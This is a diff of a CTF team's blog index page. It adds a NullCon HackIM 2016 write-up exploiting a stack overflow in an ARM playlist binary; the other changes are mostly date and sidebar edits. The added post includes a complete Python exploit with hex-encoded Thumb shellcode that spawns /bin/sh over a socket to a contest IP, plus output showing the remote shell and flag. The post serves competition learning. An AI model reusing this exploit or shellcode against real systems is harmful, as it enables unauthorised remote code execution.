@@ -9,11 +9,9 @@
   <meta name="author" content="GeeksSpeak">
 
   
-  <meta name="description" content="CSAW 2015 contacts Writeup
-Point = 250
-Category = Exploitable Hi, we are given a binary contacts, 1
+  <meta name="description" content="Hi, I participate in NullCon CTF with my team in this week. one of the challenge i solved was an arm binary pwn one. 1
 2
-hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file &hellip;">
+hamidx9@expl:~/ctf/nullcon/ &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -88,6 +86,190 @@ hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file &hellip;">
       
   <header>
     
+      <h1 class="entry-title"><a href="/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm/">Nullcon CTF - HackIM - Expl 100 - ARM</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2016-01-31T15:44:47-05:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2016</span></span> <span class='time'>3:44 pm</span></time>
+        
+           | <a href="/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm/#disqus_thread"
+             data-disqus-identifier="http://geeksspeak.github.io/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Hi,</p>
+
+<p>I participate in NullCon CTF with my team in this week. one of the challenge i solved was an arm binary pwn one.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>hamidx9@expl:~/ctf/nullcon/expl100<span class="nv">$ </span>file pinkfloyd
+</span><span class='line'>pinkfloyd: ELF 32-bit LSB  executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>62c86841d0c0384ce39d70fef5afe0eee5cad7b4, not stripped
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>pinkfloyd</code> is a arm binary which provide saving playlist functionality. we can see two methods <em>create, print</em>. Analyzing <code>cmd_do_create</code> gives us the clue that it read from input 3 param, <em>name, tag, # of songs</em>. A little more reading the diseases shows if we use more that 84 chars in tag we overflow the stack. So we can abuse this method.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
+</span><span class='line'>CANARY    : disabled
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : disabled
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : Partial
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Also <code>checksec</code> shows us we have a very suitable case, we can execute our <code>shellcode</code>.  For hijacking <code>pc</code> we should overwrite <code>lr</code> register so on returning from the call, we have full control. based on <code>add_playlist</code> function <code>myplaylist</code> on <code>bss</code> always has last playlist struct address. So we should change our <code>pc</code> to playlist struct address to run our shellcode which exists in playlist name. Also we should notice our sock fd is <code>4</code> so we need a <code>dupsh(4)</code> shellcode. Ok, too much talking, let’s do this.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># By HAMIDx9 :: GeeksSpeak :: ctf.nullcon.net HackIM :: Exploit 100</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">hexdump</span> <span class="kn">import</span> <span class="n">hexdump</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">q</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#ret = q(0x0002605c) </span>
+</span><span class='line'>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;01608fe216ff2fe14ff002014ff03f0708460d462846284401df0139fad504a082ea02024ff00b0705b4694601df01012f62696e2f736800&quot;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="c"># Custom dupsh(4) thumb shellcode based on current execution</span>
+</span><span class='line'><span class="c"># To see whats going on : </span>
+</span><span class='line'><span class="c"># from pwn import *</span>
+</span><span class='line'><span class="c"># context(arch=&quot;thumb&quot;, os=&quot;linux&quot;)</span>
+</span><span class='line'><span class="c"># print asm(shellcode[4:]) # skip change to thumb mode arm shellcode</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">hexdump</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;52.72.171.221&quot;</span><span class="p">,</span> <span class="mi">9981</span><span class="p">))</span>
+</span><span class='line'><span class="c">#s.connect((&quot;localhost&quot;, 9981))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;create</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># create a playlist</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># playlist name</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="c">#s.send(&quot;A&quot;*100+&quot;\n&quot;) # crashes in playlist tag</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">80</span><span class="o">+</span><span class="s">&quot;BBBB&quot;</span><span class="o">+</span><span class="n">q</span><span class="p">(</span><span class="mh">0x8C0CC</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># set lr to myplaylist to jump to it then,</span>
+</span><span class='line'><span class="c"># after returning from cmd_do_create pop {lr, pc} pops heap address of playlist name in pc which has our dupsh(4) shellcode</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># playlist tracks </span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="err">“</span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Here</span> <span class="n">you</span> <span class="n">go</span><span class="err">”</span>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span> <span class="c"># interact</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And running the expl:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>KernelsCallMe:exp100 hamidx9<span class="nv">$ </span>python sol.py
+</span><span class='line'>00000000: <span class="m">01</span> <span class="m">60</span> 8F E2 <span class="m">16</span> FF 2F E1  4F F0 <span class="m">02</span> <span class="m">01</span> 4F F0 3F <span class="m">07</span>  .<span class="sb">`</span>..../.O...O.?.
+</span><span class='line'>00000010: <span class="m">08</span> <span class="m">46</span> 0D <span class="m">46</span> <span class="m">28</span> <span class="m">46</span> <span class="m">28</span> <span class="m">44</span>  <span class="m">01</span> DF <span class="m">01</span> <span class="m">39</span> FA D5 <span class="m">04</span> A0  .F.F<span class="o">(</span>F<span class="o">(</span>D...9....
+</span><span class='line'>00000020: <span class="m">82</span> EA <span class="m">02</span> <span class="m">02</span> 4F F0 0B <span class="m">07</span>  <span class="m">05</span> B4 <span class="m">69</span> <span class="m">46</span> <span class="m">01</span> DF <span class="m">01</span> <span class="m">01</span>  ....O.....iF....
+</span><span class='line'>00000030: 2F <span class="m">62</span> <span class="m">69</span> 6E 2F <span class="m">73</span> <span class="m">68</span> <span class="m">00</span>                           /bin/sh.
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Here you go
+</span><span class='line'>cat *
+</span><span class='line'>cat: bin: Is a directory
+</span><span class='line'>cat: dev: Is a directory
+</span><span class='line'>flag-<span class="o">{</span>intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7<span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the flag is <code>flag-{intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7}</code> and we have 100 pts.</p>
+
+<p>@HAMIDx9</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
       <h1 class="entry-title"><a href="/blog/2015/09/21/csaw-2015-pwn250-contacts/">CSAW 2015 - PWN250 - Contacts</a></h1>
     
     
@@ -97,7 +279,7 @@ hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file &hellip;">
 
 
 
-<time class='entry-date' datetime='2015-09-21T17:43:52+04:30'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>5:43 pm</span></time>
+<time class='entry-date' datetime='2015-09-21T09:13:52-04:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>9:13 am</span></time>
         
            | <a href="/blog/2015/09/21/csaw-2015-pwn250-contacts/#disqus_thread"
              data-disqus-identifier="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/">Comments</a>
@@ -168,7 +350,7 @@ hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file &hellip;">
 
 
 
-<time class='entry-date' datetime='2015-09-21T17:42:51+04:30'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>5:42 pm</span></time>
+<time class='entry-date' datetime='2015-09-21T09:12:51-04:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>9:12 am</span></time>
         
            | <a href="/blog/2015/09/21/csaw-2015-for400-sharpturn/#disqus_thread"
              data-disqus-identifier="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-for400-sharpturn/">Comments</a>
@@ -214,7 +396,7 @@ We had a good hint :</p>
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/">DefConCTF 2015 Quals - Access Control Writeup</a></h1>
+      <h1 class="entry-title"><a href="/blog/2015/05/18/defconctf-2015-quals-access-control-writeup/">DefConCTF 2015 Quals - Access Control Writeup</a></h1>
     
     
       <p class="meta">
@@ -223,10 +405,10 @@ We had a good hint :</p>
 
 
 
-<time class='entry-date' datetime='2015-05-19T00:52:48+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:52 am</span></time>
+<time class='entry-date' datetime='2015-05-18T16:22:48-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:22 pm</span></time>
         
-           | <a href="/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/#disqus_thread"
-             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/">Comments</a>
+           | <a href="/blog/2015/05/18/defconctf-2015-quals-access-control-writeup/#disqus_thread"
+             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-access-control-writeup/">Comments</a>
         
       </p>
     
@@ -245,7 +427,7 @@ We had a good hint :</p>
   
   
     <footer>
-      <a rel="full-article" href="/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/">Read on &rarr;</a>
+      <a rel="full-article" href="/blog/2015/05/18/defconctf-2015-quals-access-control-writeup/">Read on &rarr;</a>
     </footer>
   
 
@@ -266,7 +448,7 @@ We had a good hint :</p>
 
 
 
-<time class='entry-date' datetime='2015-05-18T21:45:44+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:45 pm</span></time>
+<time class='entry-date' datetime='2015-05-18T13:15:44-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:15 pm</span></time>
         
            | <a href="/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/#disqus_thread"
              data-disqus-identifier="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/">Comments</a>
@@ -335,7 +517,7 @@ We had a good hint :</p>
 
 
 
-<time class='entry-date' datetime='2015-05-18T21:16:42+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:16 pm</span></time>
+<time class='entry-date' datetime='2015-05-18T12:46:42-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:46 pm</span></time>
         
            | <a href="/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/#disqus_thread"
              data-disqus-identifier="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/">Comments</a>
@@ -825,7 +1007,7 @@ i used the libc&rsquo;s version of the <code>babycmd</code> challenge.</p>
 
 
 
-<time class='entry-date' datetime='2015-05-18T14:19:44+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:19 pm</span></time>
+<time class='entry-date' datetime='2015-05-18T05:49:44-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:49 am</span></time>
         
            | <a href="/blog/2015/05/18/defconctf-2015-quals-catwestern-writeup/#disqus_thread"
              data-disqus-identifier="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-catwestern-writeup/">Comments</a>
@@ -1257,7 +1439,7 @@ after that i use <code>python-ptrace</code> to create child and trace the binary
 
 
 
-<time class='entry-date' datetime='2015-05-18T14:00:56+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:00 pm</span></time>
+<time class='entry-date' datetime='2015-05-18T05:30:56-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:30 am</span></time>
         
            | <a href="/blog/2015/05/18/defconctf-2015-quals-mathwize-writeup/#disqus_thread"
              data-disqus-identifier="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-mathwize-writeup/">Comments</a>
@@ -1360,7 +1542,7 @@ after that i use <code>python-ptrace</code> to create child and trace the binary
 
 
 
-<time class='entry-date' datetime='2015-05-18T13:39:52+04:30'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:39 pm</span></time>
+<time class='entry-date' datetime='2015-05-18T05:09:52-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:09 am</span></time>
         
            | <a href="/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/#disqus_thread"
              data-disqus-identifier="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/">Comments</a>
@@ -1423,7 +1605,7 @@ after that i use <code>python-ptrace</code> to create child and trace the binary
 
 
 
-<time class='entry-date' datetime='2015-04-20T22:40:13+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:40 pm</span></time>
+<time class='entry-date' datetime='2015-04-20T14:10:13-04:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:10 pm</span></time>
         
            | <a href="/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/#disqus_thread"
              data-disqus-identifier="http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/">Comments</a>
@@ -1474,59 +1656,6 @@ after that i use <code>python-ptrace</code> to create child and trace the binary
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/">NDH CTF 2015 - Weshgrow Writeup</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-04-06T16:58:41+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>6</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:58 pm</span></time>
-        
-           | <a href="/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/#disqus_thread"
-             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><strong>NDH 2015 Weshgrow Writeup</strong><br/>
-<strong>Point = 300</strong><br/>
-<strong>Category = Crypto</strong></p>
-
-<p>By openning the url we redirected to following link:</p>
-
-<blockquote><p><a href="http://weshgrow.challs.nuitduhack.com/?hmac=ca8473d35a80a5ca4e9f3555c2869f71">http://weshgrow.challs.nuitduhack.com/?hmac=ca8473d35a80a5ca4e9f3555c2869f71</a></p></blockquote>
-
-<p>As we know HMAC is a cryptographic message for authenticating using a secret key. So this has been made of something.</p>
-
-<p>Also we could find another HMAC in the page source as you can see:</p>
-
-<blockquote><p><a href="http://weshgrow.challs.nuitduhack.com/admin?hmac=fac0887096a54ac497d968daf4c4fe0b">http://weshgrow.challs.nuitduhack.com/admin?hmac=fac0887096a54ac497d968daf4c4fe0b</a></p></blockquote>
-
-<p>if you open the /flag address without the purposed HMAC you see redirection to <code>address+"#missinghmac"</code>.</p>
-
-<p>So this could be HMAC of pages and we should prepare a HMAC for <code>flag</code>.</p>
-
-</div>
-  
-  
-    <footer>
-      <a rel="full-article" href="/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/">Read on &rarr;</a>
-    </footer>
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/2">&larr; Older</a>
@@ -1542,6 +1671,10 @@ after that i use <code>python-ptrace</code> to create child and trace the binary
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm/">Nullcon CTF - HackIM - Expl 100 - ARM</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/09/21/csaw-2015-pwn250-contacts/">CSAW 2015 - PWN250 - Contacts</a>
       </li>
     
@@ -1550,15 +1683,11 @@ after that i use <code>python-ptrace</code> to create child and trace the binary
       </li>
     
       <li class="post">
-        <a href="/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/">DefConCTF 2015 Quals - Access Control Writeup</a>
+        <a href="/blog/2015/05/18/defconctf-2015-quals-access-control-writeup/">DefConCTF 2015 Quals - Access Control Writeup</a>
       </li>
     
       <li class="post">
         <a href="/blog/2015/05/18/defconctf-2015-quals-babyecho-writeup/">DefConCTF 2015 Quals - Babyecho Writeup</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/">DefConCTF 2015 Quals - ROPBaby Writeup</a>
       </li>
     
   </ul>
@@ -1603,7 +1732,7 @@ after that i use <code>python-ptrace</code> to create child and trace the binary
     </div>
   </div>
   <footer role="contentinfo"><p>
-  Copyright &copy; 2015 - GeeksSpeak -
+  Copyright &copy; 2016 - GeeksSpeak -
   <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
 </p>
 
